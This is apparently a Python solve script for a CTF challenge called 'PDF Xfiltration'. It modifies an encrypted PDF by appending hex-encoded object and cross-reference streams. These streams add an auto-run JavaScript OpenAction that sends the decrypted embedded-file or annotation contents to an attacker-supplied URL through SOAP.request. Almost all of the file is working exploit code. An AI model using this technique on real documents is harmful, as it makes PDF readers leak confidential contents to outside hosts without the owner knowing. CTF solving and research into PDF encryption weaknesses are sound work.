#!/usr/bin/env python3
#
# InsomniHack CTF Teaser 2022 - PDF Xfiltration
#
# usage: solve.py in.pdf http://my-exfil-url/ >out.pdf
#

import re
import struct
import sys
import zlib

URL = sys.argv[2]



with open(sys.argv[1], 'rb') as fp:
	d = fp.read()


js = [
	'util.stringFromStream(this.getDataObjectContents("x",true))',
	'this.getAnnots()[0].contents',
]
js = [s.replace('(', '\\(').replace(')', '\\)') for s in js]
js = js[0 if b'/FlateDecode' in d else 1]


isobj = lambda l : re.match(b'^[0-9]+\s+[0-9]+\s+obj(<|\s|$)', l)


def cntobjs():
	n = 0
	for l in d.split(b'\n'):
		if isobj(l):
			n += 1
	return n


nobjs = cntobjs() + 1

# FIXME except 2 objects in source doc
# > relocate objects based on source
objs = [
	# hide everything, first=4
	'<</Type/Catalog/Pages 5 0 R/OpenAction 8 0 R/Names<</EmbeddedFiles<< /Names[(x)<</EF<</F 1 0 R>> >>]>> >> >>',
	'<</Type/Pages/Count 1/Kids[6 0 R]>>',
	'<</Type/Page/Parent 5 0 R/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Courier>> >> >>/Annots[7 0 R]>>',
	'<</Type/Annot/Subtype/FreeText/Contents 1 0 R>>',
	'<</Type/Action/S/JavaScript/JS(SOAP.request\\("{}"+encodeURIComponent\\({}\\),[]\\))>>'.format(URL, js),
]


obj = ''
if objs:
	for i in range(len(objs)):
		s = sum([len(objs[x])+1 for x in range(i)])
		obj += '{} {} '.format(nobjs+i+1, s)
	obj = obj[:-1] + '\n'
	first = len(obj)
	for i in range(len(objs)):
		obj += '{}\n'.format(objs[i])
	obj = obj[:-1]

	print(obj, file=sys.stderr)

	import base64, binascii
	zobj = zlib.compress(obj.encode())
	#zobj = base64.b85encode(obj.encode())
	zobj = binascii.hexlify(obj.encode()) + b'>'
	#zobj = obj.encode()
	d += '''{} 0 obj
  <<
    /Type /ObjStm
    /Length {}
    /N {}
    /First {}
    /Filter[/Crypt/ASCIIHexDecode]
  >>
stream
'''.format(nobjs, len(zobj), len(objs), first).encode()

	d += zobj
	d += b'\nendstream\nendobj\n'

# -------------------------------------------------------------------- #
# https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf
# 7.5.8 Cross-Reference Streams

startxref = len(d)
size = nobjs + len(objs)

# a series of entries
# each entry has 3 elements: type, a, b (where a and b varies per entry)
# type 0: free entry (xref type f)
# > object number
# > generation number
# type 1: uncompressed entry (xref type n without /FlateDecode)
# > byte offset
# > generation number
# type 2: compressed entry (xref type n with /FlateDecode)
# > object number of the compressed stream
# > index within the compressed stream
xrefs = []
xrefs += [[0, 0, 0]]

# uncompressed objects
i = 0
for l in d.split(b'\n'):
	if isobj(l):
		xrefs += [[1, i, 0]]
	i += len(l) + 1

# compressed objects
for o in range(len(objs)):
	xrefs += [[2, nobjs, o]]

# xref
xrefs += [[1, startxref, 0]]

bxrefs = []
for xref in xrefs:
	bxrefs += ['{:02x} {:04x} {:02x}'.format(xref[0], xref[1], xref[2])]
bxrefs = '\n'.join(bxrefs) + '>'

print(bxrefs, file=sys.stderr)


# /ID: apparently arbitrary, copy it from original doc if needed
d += '''{} 0 obj
 <<
  /Type /XRef
  /Size {}
  /W [1 2 1]
  /Filter[/ASCIIHexDecode]
  /Length {}
  /Root {} 0 R
  /Encrypt {} 0 R
  /ID [<25577b924d52c40dabeb58264f356ef8><25577b924d52c40dabeb58264f356ef8>]
 >>
stream
'''.format(len(xrefs)-1, len(xrefs), len(bxrefs), nobjs+1, nobjs-1).encode()

d += bxrefs.encode()
d += b'\nendstream\nendobj\n'

# -------------------------------------------------------------------- #
# output

sys.stdout.buffer.write(d)
print('startxref\n{}\n%%EOF'.format(startxref))
